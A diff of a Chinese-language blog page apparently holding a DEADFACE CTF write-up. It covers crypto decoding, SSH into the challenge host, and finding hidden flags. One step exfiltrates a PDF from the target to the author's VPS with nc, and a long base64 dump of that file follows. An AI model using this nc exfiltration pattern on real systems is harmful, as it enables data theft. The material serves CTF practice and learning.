@@ -52,15 +52,18 @@
   };
 </script>
 
-  <meta name="keywords" content="CTF,DEADFACECTF">
+  <meta name="description" content="Poor MEAGAN!Oh, NO! Poor Megan! She’s just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been scrambled somehow. Figure out how to unscramble &amp;gt;the fo">
+<meta name="keywords" content="CTF,DEADFACECTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DEADFACECTF Writeup">
 <meta property="og:url" content="https://zhaoqi.vip/posts/2879210530/index.html">
 <meta property="og:site_name" content="温柔小猪">
+<meta property="og:description" content="Poor MEAGAN!Oh, NO! Poor Megan! She’s just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been scrambled somehow. Figure out how to unscramble &amp;gt;the fo">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-12-08T09:25:49.809Z">
+<meta property="og:updated_time" content="2021-12-08T09:29:47.236Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DEADFACECTF Writeup">
+<meta name="twitter:description" content="Poor MEAGAN!Oh, NO! Poor Megan! She’s just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been scrambled somehow. Figure out how to unscramble &amp;gt;the fo">
 
 <link rel="canonical" href="https://zhaoqi.vip/posts/2879210530/">
 
@@ -303,14 +306,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>24k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>41 分钟</span>
             </span>
 
         </div>
@@ -322,7 +325,439 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+        <h1 id="Poor-MEAGAN"><a href="#Poor-MEAGAN" class="headerlink" title="Poor MEAGAN!"></a>Poor MEAGAN!</h1><p><em>Oh, NO! Poor Megan! She’s just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been scrambled somehow. Figure out how to unscramble &gt;the formula to save Megan from certain zombification. Enter the answer as flag{here-is-the-answer}.</em></p>
+<p><em>The formula for the antidote: j2rXjx9dkhW9eLKsnMR9cLDVjh/9dwz1QfGXm+b9=wKslL1Zpb45</em></p>
+<hr>
+<p>看起来像一个base64字符串,但是似乎被混淆了,使用<a href="https://gchq.github.io/CyberChef/#recipe=From_Base64(&#39;3GHIJKLMNOPQRSTUb%3DcdefghijklmnopWXYZ/12%2B406789VaqrstuvwxyzABCDEF5&#39;,true" target="_blank" rel="noopener">CyberChef</a>&amp;input=ajJyWGp4OWRraFc5ZUxLc25NUjljTERWamgvOWR3ejFRZkdYbStiOT13S3NsTDFacGI0NQ)搭配Megan35解码即可</p>
+<p><img data-src="../../CTF/DEADFACECTF/Crypto/images/Poor_Meagan.png" alt="CyberChef"></p>
+<p><strong>flag:</strong><code>flag{Six-Parts-Honey-One-Part-Garlic}</code></p>
+<a id="more"></a>
+<h1 id="To-Be-Xor-Not-to-Be"><a href="#To-Be-Xor-Not-to-Be" class="headerlink" title="To Be Xor Not to Be"></a>To Be Xor Not to Be</h1><p><em>.$)/3&lt;’e-)&lt;e’:e&amp;’&lt;e&lt;’e-)&lt;5</em></p>
+<p><em>Submit the flag as flag{here-is-the-answer}</em></p>
+<hr>
+<p>直接使用<a href="https://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force(1,100,0,&#39;Standard&#39;,false,true,false,&#39;flag&#39;" target="_blank" rel="noopener">CyberChef</a>&amp;input=LiQpLzM8J2UtKTxlJzplJic8ZTwnZS0pPDU)里的XOR Brute Force即可:</p>
+<p><img data-src="../../CTF/DEADFACECTF/Crypto/images/To_Be_Xor_Not_to_Be.png" alt="To_Be_Xor_Not_to_Be"></p>
+<p><strong>flag:</strong><code>flag{to-eat-or-not-to-eat}</code></p>
+<h1 id="Blood-Bash"><a href="#Blood-Bash" class="headerlink" title="Blood Bash"></a>Blood Bash</h1><p><em>We’ve obtained access to a system maintained by bl0ody_mary. There are five flag files that we need you to read and submit. Submit the contents of flag1.txt.</em></p>
+<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
+<p><em>bloodbash.deadface.io:22</em></p>
+<hr>
+<p>使用<code>ssh</code>命令连接,<code>ls - R</code>后发现<code>Documents</code>目录下有一个<code>flag.txt</code>文件,直接<code>cat</code>即可.</p>
+<pre><code class="shell">╭─ ~/CTF/DEADFACECTF
+╰─$ ssh bl0ody_mary@bloodbash.deadface.io
+bl0ody_mary@bloodbash.deadface.io&#39;s password: 
+bl0ody_mary@16ef1481fce1:~$ ls -R
+.:
+&#39;De Monne Customer Portal.pdf&#39;   Documents   Downloads   Music   Pictures   Videos
+
+./Documents:
+flag1.txt
+
+./Downloads:
+
+./Music:
+
+./Pictures:
+
+./Videos:
+bl0ody_mary@16ef1481fce1:~$ cat Documents/flag1.txt
+flag{cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe}
+</code></pre>
+<p><strong>flag:</strong><code>flag{cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe}</code></p>
+<h1 id="Blood-Bash-2"><a href="#Blood-Bash-2" class="headerlink" title="Blood Bash 2"></a>Blood Bash 2</h1><p><em>We’ve obtained access to a system maintained by bl0ody_mary. We believe bl0ody_mary stole a sensitive document and is storing it on her Linux machine. Search her system for any files relating to De Monne Financial.</em></p>
+<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
+<p><em>bloodbash.deadface.io:22</em></p>
+<hr>
+<p>在<code>Documents</code>目录<code>ls -a</code>后发现存在文件<code>.demonne_info.txt</code>,<code>cat</code>即可</p>
+<pre><code class="shell">bl0ody_mary@16ef1481fce1:~$ ls -a
+.  ..  flag.txt  .demonne_info.txt
+bl0ody_mary@16ef1481fce1:~$ cat .demonne_info.txt
+flag{a856b162978fe563537c6890cb184c48fc2a018a}
+</code></pre>
+<p><strong>flag:</strong><code>flag{a856b162978fe563537c6890cb184c48fc2a018a}</code></p>
+<h1 id="Blood-Bash-3"><a href="#Blood-Bash-3" class="headerlink" title="Blood Bash 3"></a>Blood Bash 3</h1><p><em>There’s a flag on this system that we’re having difficulty with. Unlike the previous flags, we can’t seem to find a file with this flag in it. Perhaps the flag isn’t stored in a traditional file?</em></p>
+<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
+<p><em>bloodbash.deadface.io:22</em></p>
+<hr>
+<p>在Unix/Linux系统中“一切皆文件”,socket也被认为是一种文件.</p>
+<p>题意提示我们flag没有被存储在传统文件中,运行<code>netstat -ano</code></p>
+<pre><code class="shell">bl0ody_mary@5349049d19cd:~$ netstat -ano
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+udp        0      0 127.0.0.1:43526         0.0.0.0:*                           off (0.00/0/0)
+</code></pre>
+<p>注意到有本地43526端口的监听(UDP),用<code>nc</code>连接一下</p>
+<pre><code class="shell">bl0ody_mary@16ef1481fce1:~$ nc -u 127.0.0.1 43526
+flag{open_port(al)s}
+</code></pre>
+<p><strong>flag:</strong><code>flag{open_port(al)s}</code></p>
+<h1 id="Blood-Bash-4"><a href="#Blood-Bash-4" class="headerlink" title="Blood Bash 4"></a>Blood Bash 4</h1><p><em>A sensitive file from De Monne was exfiltrated by mort1cia. It contains data relating to a new web portal they’re creating for their consumers. Read the contents of the file and return the flag as <code>flag{flag_goes_here}</code>.</em></p>
+<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
+<p><em>bloodbash.deadface.io:22</em></p>
+<hr>
+<p>测试后发现无法使用<code>curl</code>,只有<code>nc</code>可以使用.</p>
+<p><code>nc</code>也可以用来传输文件,首先在自己的VPS上使用<code>nc</code>监听6379端口,准备接收文件</p>
+<pre><code class="shell">root@VM-8-4-centos: ~$ nc -l 8000 &gt; a.pdf
+</code></pre>
+<p>在比赛的服务器上用<code>nc</code>发送文件</p>
+<pre><code class="shell">bl0ody_mary@5349049d19cd:~$ nc -w 10 xx.xx.xxx.xxx 8000 &lt; De\ Monne\ Customer\ Portal.pdf
+</code></pre>
+<p>下载pdf文件并打开,即可看到flag</p>
+<p><img data-src="../../CTF/DEADFACECTF/Forensics/images/Blood_Bash4.png" alt="Blood Bash 4"></p>
+<h2 id="另一种解法"><a href="#另一种解法" class="headerlink" title="另一种解法"></a>另一种解法</h2><p>在比赛的服务器上使用<code>base64</code>命令将文件编码,复制后保存至本地文件<code>encoded</code></p>
+<pre><code class="shell">~$ base64 De\ Monne\ Customer\ Portal.pdf
+JVBERi0xLjYNJeLjz9MNCjExIDAgb2JqDTw8L0xpbmVhcml6ZWQgMS9MIDEyNDQ0L08gMTMvRSA4
+MjgyL04gMS9UIDEyMTQxL0ggWyA0MzggMTQ1XT4+DWVuZG9iag0gICAgICAgICAgICAgICAgICAg
+DQoxNiAwIG9iag08PC9EZWNvZGVQYXJtczw8L0NvbHVtbnMgMy9QcmVkaWN0b3IgMTI+Pi9GaWx0
+ZXIvRmxhdGVEZWNvZGUvSURbPDAyRjM1ODk5M0MxRDE0NEU4Q0Y2RDJGMkEyNzlBQzRGPjwxRUIy
+RkIxOTI5MURDRDREOTgzOTc3MTU5QzlBNzU5Nj5dL0luZGV4WzExIDddL0luZm8gMTAgMCBSL0xl
+bmd0aCAzNi9QcmV2IDEyMTQyL1Jvb3QgMTIgMCBSL1NpemUgMTgvVHlwZS9YUmVmL1dbMSAyIDBd
+Pj5zdHJlYW0NCmjeYmJkEGBiYDJnYmDwYWJg3AWkS5gY/m4Gsp0AAgwAI6cDxw0KZW5kc3RyZWFt
+DWVuZG9iag1zdGFydHhyZWYNCjANCiUlRU9GDQogICAgICAgIA0KMTcgMCBvYmoNPDwvRmlsdGVy
+L0ZsYXRlRGVjb2RlL0kgODIvTGVuZ3RoIDYxL08gNjYvUyAzNj4+c3RyZWFtDQpo3mJgYGBmYGBi
+YgAC2eMMmICFgQOJxwzFDAwlDLxMBgwWXiA2IwODQjSEZrgD1sOgNw3KvwkQYACjPAUuDQplbmRz
+dHJlYW0NZW5kb2JqDTEyIDAgb2JqDTw8L01ldGFkYXRhIDIgMCBSL091dGxpbmVzIDYgMCBSL1Bh
+Z2VzIDkgMCBSL1R5cGUvQ2F0YWxvZz4+DWVuZG9iag0xMyAwIG9iag08PC9Db250ZW50cyAxNCAw
+IFIvQ3JvcEJveFswLjAgMC4wIDYxMi4wIDc5Mi4wXS9NZWRpYUJveFswLjAgMC4wIDYxMi4wIDc5
+Mi4wXS9QYXJlbnQgOSAwIFIvUmVzb3VyY2VzPDwvUHJvY1NldFsvUERGL0ltYWdlQ10vWE9iamVj
+dDw8L0ltMCAxNSAwIFI+Pj4+L1JvdGF0ZSAwL1R5cGUvUGFnZT4+DWVuZG9iag0xNCAwIG9iag08
+PC9MZW5ndGggNjY+PnN0cmVhbQ0KcQoyNzMuMDIwMDE5NSAwIDAgMzQuMTk5OTk2OSAxNjEuNzcw
+NjkwOSA3MjQuMDk3Nzc4MyBjbQovSW0wIERvClEKDQplbmRzdHJlYW0NZW5kb2JqDTE1IDAgb2Jq
+DTw8L0JpdHNQZXJDb21wb25lbnQgOC9Db2xvclNwYWNlL0RldmljZVJHQi9GaWx0ZXIvRENURGVj
+b2RlL0hlaWdodCA1Ny9MZW5ndGggNzE1OC9OYW1lL1gvU3VidHlwZS9JbWFnZS9UeXBlL1hPYmpl
+Y3QvV2lkdGggNDU1Pj5zdHJlYW0NCv/Y/+4ADkFkb2JlAGQAAAAAAf/bAMUADAgICAgIDAgIDBAL
+CwsMDw4NDQ4UEg4OExMSFxQSFBQaGxcUFBseHicbFCQnJycnJDI1NTUyOzs7Ozs7Ozs7OwENCgoM
+CgwODAwOEQ4ODA0RFBQPDxEUEBEYERAUFBMUFRUUExQVFRUVFRUVGhoaGhoaHh4eHh4jIyMjJycn
+LCwsAg0KCgwKDA4MDA4RDg4MDREUFA8PERQQERgREBQUExQVFRQTFBUVFRUVFRUaGhoaGhoeHh4e
+HiMjIyMnJycsLCz/3QAEAB3/wAARCAA5AccDACIAAREBAhEC/8QBogABAAMAAQQDAAAAAAAAAAAA
+AAUGBwIBAwQICQoLAQEAAQEJAAAAAAAAAAAAAAAAAQIDBAUGBwgJCgsQAAADAwMDBAxZLQAAAAAA
+AAECAwAEEQUGEgcTIRQxMkEVFiIjNkJRYXWBk7IICQoXGBkaJCUmJygpKjM0NTc4OTpDREVGR0hJ
+SlJTVFVWV1hZWmJjZGVmZ2hpanFyc3R2d3h5eoKDhIWGh4iJipGSlJWWl5iZmqGio6Slpqeoqaqx
+s7S1tre4ubrBwsPExcbHyMnK0dLT1NXW19jZ2uHi4+Tl5ufo6erw8fLz9PX29/j5+hEAAAECBAQH
+cx0AAAAAAAAAAQACESExQQMSUWETQkNxgdHwBAUGBwgJChQVFhcYGRoiIyQlJicoKSoyMzQ1Njc4
+OTpERUZHSElKUlNUVVZXWFlaYmNkZWZnaGlqcnN0dXZ3eHl6goOEhYaHiImKkZKTlJWWl5iZmqGi
+o6SlpqeoqaqxsrO0tba3uLm6wcLDxMXGx8jJ8crS09TV1tfY2drh4uPk5ebn6Onq8vP09fb3+Pn6
+/9oADAMAAAERAhEAPwDVWMYwhGN213h3dUjLvSpEUiXJRQwEIG/iIgAN4rpLsiSgY5HCUHV6MmQT
+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
